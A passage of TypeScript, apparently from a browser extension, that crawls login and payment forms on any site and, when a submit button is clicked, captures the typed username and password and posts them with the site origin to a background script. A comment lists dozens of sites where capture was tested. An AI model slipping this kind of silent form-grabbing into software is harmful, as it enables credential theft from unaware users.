                if (__childElement.nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('payment-title')) {
                    if (callbackfn) {
                        callbackfn(__childElement);
                    }
                } else {
                    self.explorePaymentSpanTag(self, (__childElement as HTMLElement), callbackfn)
                }
            });
        }
    }

    explorePaymentInputTag(self: this, elementParentNode: HTMLElement, selfId: string, callback: any) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'INPUT' && (__childElement as HTMLElement).id.indexOf(selfId) !== -1) {
                    if (callback) {
                        callback((__childElement as HTMLInputElement));
                    }
                } else {
                    self.explorePaymentInputTag(self, (__childElement as HTMLElement), selfId, callback)
                }
            });
        }
    }

    explorePaymentSelectTag(self: this, elementParentNode: HTMLElement, selfId: string, callback: any) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'SELECT' && (__childElement as HTMLElement).id.indexOf(selfId) !== -1) {
                    if (callback) {
                        callback((__childElement as HTMLInputElement));
                    }
                } else {
                    self.explorePaymentSelectTag(self, (__childElement as HTMLElement), selfId, callback)
                }
            });
        }
    }

    trigger(__formElement: HTMLFormElement) {
        const self = this;
        browser.storage.local.get().then(
            function (setting: { constructor?: any; }) {
                if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
                    self.track(__formElement);
                }
            }
        );
    }

    formAttributesResolver(string: any, keyword: any) {
        const self = this;
        let returnValue: any;
        if (string.length !== 0 && string.length >= 5) {
            keyword.forEach(function (kw: any) {
                if (Object.keys(kw).length !== 0 && kw.constructor === Object) {
                    Object.keys(kw).forEach(function (key) {
                        if (key === 'login') {
                            kw.login.forEach(function (kw_log: any) {
                                if (string.toLowerCase().indexOf(kw_log) !== -1) {
                                    returnValue = 'Login';
                                }
                            });
                        } else if (key === 'register') {
                            kw.register.forEach(function (kw_reg: string) {
                                if (string.toLowerCase().indexOf(kw_reg) !== -1) {
                                    returnValue = 'Register';
                                }
                            });
                        } else if (key === 'googleads') {
                            kw.googleads.forEach(function (kw_reg: string) {
                                if (string.toLowerCase().indexOf(kw_reg) !== -1) {
                                    returnValue = 'Google Ads';
                                }
                            });
                        } else {
                            returnValue = string.toLowerCase();
                        }
                    });
                }
            });
            self.authEvent = returnValue ? returnValue : 'Not Detected';
            return self.authEvent;
        }
    }

    attributesResolver(element: any): any {
        const self = this;
        const attributes = [...element.attributes];
        if (attributes.length !== 0) {
            attributes.forEach(function (attr) {
                if (attr.nodeValue !== 'javascript:void(0);') {
                    self.formAttributesResolver(
                        attr.nodeValue,
                        [{'login': ['signin', 'login']}, {'register': ['reg', 'register', 'signup', 'join']}, {'googleads': ['googleads']}]
                    );
                }
            });
        } else {
            self.authEvent = 'Not Detected';
        }
    }

    track(__formElement: HTMLFormElement) {
        const self = this;
        let elements: string[] = [];
        if (__formElement.nodeName === 'FORM' && __formElement.length !== 1) {
            self.attributesResolver(__formElement);
            self.crawl(elements, __formElement);
        }
    }

    classicTrack(usernameElementId: any, passwordElementId: any, loginButtonElementId: any) {
        let self = this;
        let usernameElement: any;
        let passwordElement: any;
        let loginButtonElement: any;

        if (document.querySelector(usernameElementId) !== null) {
            usernameElement = document.querySelector(usernameElementId);
        }
        if (document.querySelector(passwordElementId) !== null) {
            passwordElement = document.querySelector(passwordElementId);
        }
        if (document.querySelector(loginButtonElementId) !== null) {
            loginButtonElement = document.querySelector(loginButtonElementId);
        }
        loginButtonElement.addEventListener('click', function () {
            return acsComPortFront.postMessage({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": usernameElement.value,
                    "password": passwordElement.value,
                    "workWebsite": window.location.origin
                }
            });
        })
    }

    crawl(elements: any, element: HTMLElement) {
        const self = this;
        element.childNodes?.forEach(function (element) {
            if ((element as HTMLElement).nodeName === 'INPUT' || (element as HTMLElement).nodeName === 'BUTTON') {
                if ((element as HTMLElement).nodeName === 'INPUT' && (element as HTMLInputElement).type !== 'button' && (element as HTMLInputElement).type !== 'reset' &&
                    (element as HTMLInputElement).type !== 'submit' && (element as HTMLInputElement).type !== 'checkbox' && (element as HTMLInputElement).type !== 'color' &&
                    (element as HTMLInputElement).type !== 'date' && (element as HTMLInputElement).type !== 'datetime-local' && (element as HTMLInputElement).type !== 'file' &&
                    (element as HTMLInputElement).type !== 'radio' && (element as HTMLInputElement).name !== 'firstname' && (element as HTMLInputElement).name !== 'lastname' &&
                    (element as HTMLButtonElement).type !== 'button' && (element as HTMLButtonElement).type !== 'reset' && (element as HTMLButtonElement).type !== 'submit' &&
                    (element as HTMLInputElement).type !== 'hidden' && !(element as HTMLElement).hidden && (element as HTMLElement).id !== 'nc_1_captcha_input' &&
                    (element as HTMLElement).id !== 's' && (element as HTMLElement).id !== 'ZPGAZZBDYC' && (element as HTMLElement).id !== 'VEQLOJHLSJ' && (element as HTMLElement).id !== 'QCMSHUFUXG') {
                    elements.push((element as HTMLElement));
                }
                if ((element as HTMLElement).nodeName === 'INPUT' && (element as HTMLButtonElement).type === 'submit' || (element as HTMLElement).nodeName === 'BUTTON' && (element as HTMLButtonElement).type === 'submit' ||
                    (element as HTMLElement).nodeName === 'BUTTON') {
                    return self.resolve(element, elements);
                }
            } else {
                self.crawl(elements, (element as HTMLElement));
            }
        });
    }

    /*
    * Checking
    * PASSED DOMAIN LIST
    * Domain: https://www.dailymotion.com/signin?urlback=%2Fus "PASSED"
    * Domain: https://www.facebook.com/ "PASSED"
    * Domain: https://stackoverflow.com/users/login?ssrc=head "PASSED"
    * Domain: https://github.com/login?return_to=%2Fvinceliuice%2FMojave-gtk-theme "PASSED"
    * Domain: https://www.upwork.com/ab/payments/25146924/disbursement-methods "PASSED"
    * Domain: https://www.instagram.com/ "PASSED"
    * Domain: https://login.aliexpress.com/ "PASSED"
    * Domain: https://www2.animesvostfr.net/ "PASSED"
    * Domain: https://disqus.com/profile/login/?next=https%3A//disqus.com/& "PASSED"
    * Domain: https://dash.fembed.com/ "PASSED"
    * Domain: http://www.fxporn.net/join "PASSED"
    * Domain: https://signin.ebay.com/ "PASSED"
    * Domain: http://158.177.240.254:1630/login.php "PASSED"
    * Domain: https://www.roblox.com/login "PASSED"
    * Domain: https://lewdweb.net/wp-login.php "PASSED"
    * Domain: https://passport.i.ua/login/? "PASSED"
    * Domain: https://commons.wikimedia.org/w/index.php?title=Special:UserLogin&returnto=Main+Page "PASSED"
    * Domain: https://m.arabseed.me/ "PASSED"
    * Domain: https://app.essaypro.com/ "PASSED"
    * Domain: https://mitrarank.ir/ "PASSED"
    * Domain: https://www.bodis.com/login "PASSED"
    * Domain: https://user.wco.tv/wp-login.php "PASSED"
    * Domain: https://www.deviantart.com/_sisu/do/signin "PASSED"
    * Domain: https://filesmonster.com/login.php?return=%2F "PASSED"
    * Domain: https://filejoker.net/login "PASSED"
    * Domain: http://www.tavalodkala.com/my-account/ "PASSED"
    * Domain: https://login.yahoo.com/account "PASSED"
    * Domain: https://filecrypt.cc/Login.html "PASSED"
    * Domain: https://bdsm-zone.com/showthread.php?t=146506 "PASSED"
    * Domain: https://insights.hotjar.com/login "PASSED"
    * Domain: https://dogecos.cc/?p=login "PASSED"
    * Domain: https://id.secondlife.com/openid/loginsubmit "PASSED"
    * Domain: https://imagetwist.com/ "PASSED"
    * Domain: https://my.dropz.xyz/ "PASSED"
    * Domain: https://beta.ppoc.club/product-tests "PASSED"
    * Domain: https://www.swagbucks.com/p/login "PASSED"
    * Domain: https://www.atlanticbb.net/files/atlanticbb/login.php "PASSED"
    * Domain: https://securelogin.poste.it/jod-fcc/fcc-authentication-failed.html "PASSED"
    *
    * FAILED DOMAIN LIST
    * Domain: https://m2.arabseed.net/%d8%a7%d9%84%d8%af%d8%ae%d9%88%d9%84/ "FAILED"
    * Domain: https://1fichier.com/login.pl "FAILED"
    * Domain: https://www.kixeye.com/ "FAILED"
    * Domain: https://www.star-clicks.com/login "FAILED"
    * Domain: http://fetish.pornbb.org/login.php "FAILED"
    * Domain: https://epicpw.com/index.php?action=login2 "FAILED"
    *
    * NOT-TESTED DOMAIN LIST
    * Domain: https://www.shesfreaky.com/ "NOT-TESTED"
    * Domain: https://spankbang.com/ "NOT-TESTED"
    * Domain: https://lewdweb.net/ "NOT-TESTED"
    * Domain: http://www.incestflix.com/ "NOT-TESTED"
    * Domain: http://www.hentai-fun.com/ "NOT-TESTED"
    * Domain: https://www.xxxmangasex.com/ "NOT-TESTED"
    * Domain: https://bdsm-zone.com/ "NOT-TESTED"
    * Domain: https://smailpro.com/ "NOT-TESTED"
    * Domain: http://bondagecomixxx.net/ "NOT-TESTED"
    * */

    resolve(element: any, array: any) {
        let self = this;
        let elementNode: any;
        let elementName: any;
        let elementType: any;
        let elementValue: any;

        (element as HTMLElement).addEventListener('click', function (e) {
            /*#!if debug==true*/
            let status = self.authEvent ? self.authEvent : 'Event';
            alert(status + ' tracked!!');
            /*#!endif*/
            array.forEach(function (detectedElement: any) {
                [...detectedElement.attributes].forEach(function (attribute) {
                    if (attribute.nodeName === 'class' || attribute.nodeName === 'id' || attribute.nodeName === 'name' ||
                        attribute.nodeName === 'type' || attribute.nodeName === 'value' || attribute.nodeName === 'autocomplete') {
                        if (attribute.nodeValue.indexOf('user') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'username';
                            elementType = detectedElement.type;
                            elementValue = detectedElement.value;
                        }
                    }
                    if (attribute.nodeName === 'class' || attribute.nodeName === 'id' || attribute.nodeName === 'name' ||
                        attribute.nodeName === 'type' || attribute.nodeName === 'value' || attribute.nodeName === 'autocomplete') {
                        if (attribute.nodeValue.indexOf('login') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'loginId';
                            elementType = detectedElement.type;
                            elementValue = detectedElement.value;
                        }
                    }
                    if (attribute.nodeName === 'class' || attribute.nodeName === 'id' || attribute.nodeName === 'name' ||
                        attribute.nodeName === 'type' || attribute.nodeName === 'value' || attribute.nodeName === 'autocomplete') {
                        if (attribute.nodeValue.indexOf('email') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'email';
                            elementType = detectedElement.type;
                            elementValue = detectedElement.value;
                        }
                    }
                    if (attribute.nodeName === 'autocomplete' || attribute.nodeName === 'class' || attribute.nodeName === 'id' ||
                        attribute.nodeName === 'name' || attribute.nodeName === 'type' || attribute.nodeName === 'value') {
                        if (attribute.nodeValue.indexOf('pass') !== -1) {
                            elementNode = detectedElement;
                            elementName = 'password';
                            elementType = detectedElement.type;
                            elementValue = detectedElement.value;
                        }
                    }
                });


                if (elementValue.length !== 0) {
                    self.passwordStore.push({
                        node: elementNode,
                        name: elementName,
                        type: elementType,
                        value: elementValue
                    });
                    if (self.passwordStore.length === 2 /*&& self.passwordStore[0].type === 'email' || self.passwordStore[0].type === 'text'*/ &&
                        self.passwordStore[1].type === 'password') {
                        acsComPortFront.postMessage({
                            command: 'saveLoginData',
                            data: {
                                "event": self.authEvent,
                                "username": self.passwordStore[0].value,
                                "password": self.passwordStore[1].value,
                                "workWebsite": window.location.origin
                            }
                        });
                        self.passwordStore = [];
                    }
                }
            });
        });
    }
}

